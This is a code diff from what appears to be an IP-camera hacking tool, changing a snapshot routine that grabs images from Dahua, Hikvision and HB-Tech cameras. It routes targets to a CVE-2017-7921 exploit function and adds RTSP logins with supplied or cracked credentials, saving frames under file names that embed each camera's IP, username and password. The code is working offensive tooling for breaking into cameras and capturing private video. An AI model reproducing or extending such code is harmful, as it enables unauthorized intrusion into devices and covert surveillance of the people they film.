@@ -29,12 +29,16 @@ def save_snapshot(args) -> None:
 
     camera_info = [args.ip, args.port, args.user, args.passwd, args.device, args.vulnerability]
     try:
-        # user & passwd (Dahua / Hikvision)
-        if camera_info[2] and camera_info[3] and (camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision'):
-            snapshot_rtsp(*camera_info[:4], snapshot_path)
         # cve-2017-7921
         if camera_info[-1] == 'cve-2017-7921':
             snapshot_cve_2017_7921(camera_info[0], camera_info[1], snapshot_path)
+        elif camera_info[2]:
+            # user & passwd (Dahua / Hikvision)
+            if camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision':
+                snapshot_rtsp(*camera_info[:4], snapshot_path)
+            # multiplay
+            if camera_info[4] == 'HB-Tech/Hikvision':
+                snapshot_rtsp_hb(*camera_info[:4], snapshot_path)
     except Exception as e:
         pass
 
@@ -42,6 +46,18 @@ def save_snapshot(args) -> None:
 def snapshot_rtsp(ip, port, user, passwd, sv_path):
     """get snapshot through rtsp"""
     with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554", verbose=False) as client:
+        while client.isOpened():
+            img = client.read(raw=True)
+            if not img is None:
+                name = f"{ip}:{port}-{user}-{passwd}.jpg"
+                img = Image.fromarray(img)
+                img.save(os.path.join(sv_path, name))
+                break
+
+
+def snapshot_rtsp_hb(ip, port, user, passwd, sv_path):
+    """get hb-tech/hikvision snapshot through rtsp (multiplay, get channel 0)"""
+    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream", verbose=False) as client:
         while client.isOpened():
             img = client.read(raw=True)
             if not img is None:
